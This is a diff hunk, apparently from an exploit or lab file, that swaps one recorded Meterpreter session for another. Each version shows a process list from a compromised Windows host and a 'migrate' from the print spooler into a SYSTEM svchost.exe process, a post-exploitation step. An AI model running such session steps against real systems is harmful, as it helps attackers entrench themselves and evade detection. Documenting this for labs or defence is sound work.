@@ -14,78 +14,89 @@ meterpreter > ps
 Process List
 ============
 
- PID   PPID  Name         Arch  Session  User               Path
- ---   ----  ----         ----  -------  ----               ----
- 0     0     [System Pro
-             cess]
- 4     0     System       x64   0
- 416   4     smss.exe     x64   0        NT AUTHORITY\SYST  \SystemRoot\System
-                                         EM                 32\smss.exe
- 428   664   LogonUI.exe  x64   1        NT AUTHORITY\SYST  C:\Windows\system3
-                                         EM                 2\LogonUI.exe
- 476   712   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
-                                         EM                 2\svchost.exe
- 484   712   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\system3
-                                         EM                 2\svchost.exe
- 564   556   csrss.exe    x64   0        NT AUTHORITY\SYST  C:\Windows\system3
-                                         EM                 2\csrss.exe
- 612   556   wininit.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\system3
-                                         EM                 2\wininit.exe
- 624   604   csrss.exe    x64   1        NT AUTHORITY\SYST  C:\Windows\system3
-                                         EM                 2\csrss.exe
- 664   604   winlogon.ex  x64   1        NT AUTHORITY\SYST  C:\Windows\system3
-             e                           EM                 2\winlogon.exe
- 708   712   svchost.exe  x64   0        NT AUTHORITY\LOCA  C:\Windows\system3
-                                         L SERVICE          2\svchost.exe
- 712   612   services.ex  x64   0        NT AUTHORITY\SYST  C:\Windows\system3
-             e                           EM                 2\services.exe
- 720   612   lsass.exe    x64   0        NT AUTHORITY\SYST  C:\Windows\system3
-                                         EM                 2\lsass.exe
- 728   612   lsm.exe      x64   0        NT AUTHORITY\SYST  C:\Windows\system3
-                                         EM                 2\lsm.exe
- 836   712   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\system3
-                                         EM                 2\svchost.exe
- 904   712   svchost.exe  x64   0        NT AUTHORITY\NETW  C:\Windows\system3
-                                         ORK SERVICE        2\svchost.exe
- 952   712   svchost.exe  x64   0        NT AUTHORITY\LOCA  C:\Windows\System3
-                                         L SERVICE          2\svchost.exe
- 1084  712   svchost.exe  x64   0        NT AUTHORITY\LOCA  C:\Windows\system3
-                                         L SERVICE          2\svchost.exe
- 1180  712   svchost.exe  x64   0        NT AUTHORITY\NETW  C:\Windows\system3
-                                         ORK SERVICE        2\svchost.exe
- 1296  712   spoolsv.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
-                                         EM                 2\spoolsv.exe
- 1344  712   svchost.exe  x64   0        NT AUTHORITY\LOCA  C:\Windows\system3
-                                         L SERVICE          2\svchost.exe
- 1428  712   amazon-ssm-  x64   0        NT AUTHORITY\SYST  C:\Program Files\A
-             agent.exe                   EM                 mazon\SSM\amazon-s
-                                                            sm-agent.exe
- 1484  712   LiteAgent.e  x64   0        NT AUTHORITY\SYST  C:\Program Files\A
-             xe                          EM                 mazon\XenTools\Lit
-                                                            eAgent.exe
- 1628  712   Ec2Config.e  x64   0        NT AUTHORITY\SYST  C:\Program Files\A
-             xe                          EM                 mazon\Ec2ConfigSer
-                                                            vice\Ec2Config.exe
- 1840  712   TrustedInst  x64   0        NT AUTHORITY\SYST  C:\Windows\servici
-             aller.exe                   EM                 ng\TrustedInstalle
-                                                            r.exe
- 1956  712   svchost.exe  x64   0        NT AUTHORITY\NETW  C:\Windows\system3
-                                         ORK SERVICE        2\svchost.exe
- 2108  836   WmiPrvSE.ex  x64   0        NT AUTHORITY\NETW  C:\Windows\system3
-             e                           ORK SERVICE        2\wbem\wmiprvse.ex
-                                                            e
- 2512  712   sppsvc.exe   x64   0        NT AUTHORITY\NETW  C:\Windows\system3
-                                         ORK SERVICE        2\sppsvc.exe
- 2648  712   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
-                                         EM                 2\svchost.exe
- 2684  712   vds.exe      x64   0        NT AUTHORITY\SYST  C:\Windows\System3
-                                         EM                 2\vds.exe
- 2824  712   SearchIndex  x64   0        NT AUTHORITY\SYST  C:\Windows\system3
-             er.exe                      EM                 2\SearchIndexer.ex
-                                                            e
-meterpreter > migrate 1956
-[*] Migrating from 1296 to 1956...
+ PID   PPID  Name        Arch  Session  User              Path
+ ---   ----  ----        ----  -------  ----              ----
+ 0     0     [System Pr
+             ocess]
+ 4     0     System      x64   0
+ 416   4     smss.exe    x64   0        NT AUTHORITY\SYS  \SystemRoot\Syst
+                                        TEM               em32\smss.exe
+ 432   708   svchost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\Syste
+             e                          TEM               m32\svchost.exe
+ 480   708   svchost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\syste
+             e                          TEM               m32\svchost.exe
+ 564   556   csrss.exe   x64   0        NT AUTHORITY\SYS  C:\Windows\syste
+                                        TEM               m32\csrss.exe
+ 612   556   wininit.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\syste
+             e                          TEM               m32\wininit.exe
+ 620   604   csrss.exe   x64   1        NT AUTHORITY\SYS  C:\Windows\syste
+                                        TEM               m32\csrss.exe
+ 660   604   winlogon.e  x64   1        NT AUTHORITY\SYS  C:\Windows\syste
+             xe                         TEM               m32\winlogon.exe
+ 708   612   services.e  x64   0        NT AUTHORITY\SYS  C:\Windows\syste
+             xe                         TEM               m32\services.exe
+ 716   612   lsass.exe   x64   0        NT AUTHORITY\SYS  C:\Windows\syste
+                                        TEM               m32\lsass.exe
+ 724   612   lsm.exe     x64   0        NT AUTHORITY\SYS  C:\Windows\syste
+                                        TEM               m32\lsm.exe
+ 832   708   svchost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\syste
+             e                          TEM               m32\svchost.exe
+ 900   708   svchost.ex  x64   0        NT AUTHORITY\NET  C:\Windows\syste
+             e                          WORK SERVICE      m32\svchost.exe
+ 948   708   svchost.ex  x64   0        NT AUTHORITY\LOC  C:\Windows\Syste
+             e                          AL SERVICE        m32\svchost.exe
+ 1016  660   LogonUI.ex  x64   1        NT AUTHORITY\SYS  C:\Windows\syste
+             e                          TEM               m32\LogonUI.exe
+ 1080  708   svchost.ex  x64   0        NT AUTHORITY\LOC  C:\Windows\syste
+             e                          AL SERVICE        m32\svchost.exe
+ 1184  708   svchost.ex  x64   0        NT AUTHORITY\NET  C:\Windows\syste
+             e                          WORK SERVICE      m32\svchost.exe
+ 1312  708   spoolsv.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\Syste
+             e                          TEM               m32\spoolsv.exe
+ 1348  708   svchost.ex  x64   0        NT AUTHORITY\LOC  C:\Windows\syste
+             e                          AL SERVICE        m32\svchost.exe
+ 1428  708   amazon-ssm  x64   0        NT AUTHORITY\SYS  C:\Program Files
+             -agent.exe                 TEM               \Amazon\SSM\amaz
+                                                          on-ssm-agent.exe
+ 1484  708   LiteAgent.  x64   0        NT AUTHORITY\SYS  C:\Program Files
+             exe                        TEM               \Amazon\XenTools
+                                                          \LiteAgent.exe
+ 1616  708   Ec2Config.  x64   0        NT AUTHORITY\SYS  C:\Program Files
+             exe                        TEM               \Amazon\Ec2Confi
+                                                          gService\Ec2Conf
+                                                          ig.exe
+ 1904  2072  mscorsvw.e  x64   0        NT AUTHORITY\SYS  C:\Windows\Micro
+             xe                         TEM               soft.NET\Framewo
+                                                          rk64\v4.0.30319\
+                                                          mscorsvw.exe
+ 1944  708   svchost.ex  x64   0        NT AUTHORITY\NET  C:\Windows\syste
+             e                          WORK SERVICE      m32\svchost.exe
+ 2072  708   mscorsvw.e  x64   0        NT AUTHORITY\SYS  C:\Windows\Micro
+             xe                         TEM               soft.NET\Framewo
+                                                          rk64\v4.0.30319\
+                                                          mscorsvw.exe
+ 2080  832   WmiPrvSE.e  x64   0        NT AUTHORITY\NET  C:\Windows\syste
+             xe                         WORK SERVICE      m32\wbem\wmiprvs
+                                                          e.exe
+ 2368  708   svchost.ex  x64   0        NT AUTHORITY\LOC  C:\Windows\syste
+             e                          AL SERVICE        m32\svchost.exe
+ 2420  708   sppsvc.exe  x64   0        NT AUTHORITY\NET  C:\Windows\syste
+                                        WORK SERVICE      m32\sppsvc.exe
+ 2544  708   svchost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\Syste
+             e                          TEM               m32\svchost.exe
+ 2580  708   vds.exe     x64   0        NT AUTHORITY\SYS  C:\Windows\Syste
+                                        TEM               m32\vds.exe
+ 2728  708   SearchInde  x64   0        NT AUTHORITY\SYS  C:\Windows\syste
+             xer.exe                    TEM               m32\SearchIndexe
+                                                          r.exe
+ 3064  708   TrustedIns  x64   0        NT AUTHORITY\SYS  C:\Windows\servi
+             taller.exe                 TEM               cing\TrustedInst
+                                                          aller.exe
+
+meterpreter > migrate 2544
+[*] Migrating from 1312 to 2544...
 [*] Migration completed successfully.
+
 
 meterpreter>
 */............................................................................................................................................./*
